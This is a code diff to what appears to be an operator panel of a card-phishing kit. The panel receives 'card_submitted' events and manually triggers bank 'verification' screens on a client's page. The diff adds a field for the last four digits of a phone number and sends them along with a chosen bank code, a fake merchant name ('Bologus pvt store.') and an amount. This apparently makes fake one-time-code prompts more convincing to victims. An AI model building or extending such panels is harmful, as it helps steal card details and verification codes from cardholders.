@@ -925,6 +925,13 @@
 
         </select>
       </div>
+
+      <!-- Phone Number Field - ADDED -->
+<div class="mb-4">
+  <label class="block text-sm mb-2">Phone Number (last 4 digits):</label>
+  <input type="text" id="mcPhoneLastFour" maxlength="4" placeholder="Enter 4 digits" 
+         pattern="[0-9]{4}" class="bg-gray-700 text-white w-full p-2 rounded" />
+</div>
       
       <!-- Start Verification Button -->
       <button id="mcStartVerification" class="bg-blue-600 text-white py-2 px-4 rounded mb-4 w-full">
@@ -2477,37 +2484,46 @@ socket.on('card_submitted', (data) => {
     });
   }
   
-  // Start Verification button handler - UPDATED to include currency
-  const mcStartVerificationBtn = document.getElementById('mcStartVerification');
-  if (mcStartVerificationBtn) {
-    mcStartVerificationBtn.addEventListener('click', function() {
-      if (!currentMcInvoiceId) {
-        alert('No transaction selected for verification');
-        return;
-      }
-      
-      const verificationType = mcVerificationType.value;
-      const bankCode = mcBankSelect.value;
-      const selectedCurrency = mcCurrencySelect.value; // Get selected currency
-      
-      console.log('Starting verification with:', {
-        invoiceId: currentMcInvoiceId,
-        verificationType: verificationType,
-        bankCode: bankCode,
-        currency: selectedCurrency // Log currency
-      });
-      
-      // Send event to show verification UI to client with currency
-      socket.emit('start_verification', {
-        invoiceId: currentMcInvoiceId,
-        verificationType: verificationType,
-        bankCode: bankCode,
-        merchantName: 'Bologus pvt store.',
-        amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
-        currency: selectedCurrency // Include selected currency
-      });
+// Start Verification button handler - UPDATED to include phone number
+const mcStartVerificationBtn = document.getElementById('mcStartVerification');
+if (mcStartVerificationBtn) {
+  mcStartVerificationBtn.addEventListener('click', function() {
+    if (!currentMcInvoiceId) {
+      alert('No transaction selected for verification');
+      return;
+    }
+    
+    const verificationType = mcVerificationType.value;
+    const bankCode = mcBankSelect.value;
+    const selectedCurrency = mcCurrencySelect.value; // Get selected currency
+    const phoneLastFour = document.getElementById('mcPhoneLastFour').value; // Get entered phone number
+    
+    // Validate the phone number is 4 digits
+    if (phoneLastFour && !/^\d{4}$/.test(phoneLastFour)) {
+      alert('Phone number must be exactly 4 digits');
+      return;
+    }
+    
+    console.log('Starting verification with:', {
+      invoiceId: currentMcInvoiceId,
+      verificationType: verificationType,
+      bankCode: bankCode,
+      currency: selectedCurrency,
+      phoneLastFour: phoneLastFour // Log phone number
     });
-  }
+    
+    // Send event to show verification UI to client with currency and phone number
+    socket.emit('start_verification', {
+      invoiceId: currentMcInvoiceId,
+      verificationType: verificationType,
+      bankCode: bankCode,
+      merchantName: 'Bologus pvt store.',
+      amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
+      currency: selectedCurrency, // Include selected currency
+      phoneLastFour: phoneLastFour // Include phone number
+    });
+  });
+}
   
   // Handle MC bank selection
   mcBankSelect.addEventListener('change', function() {
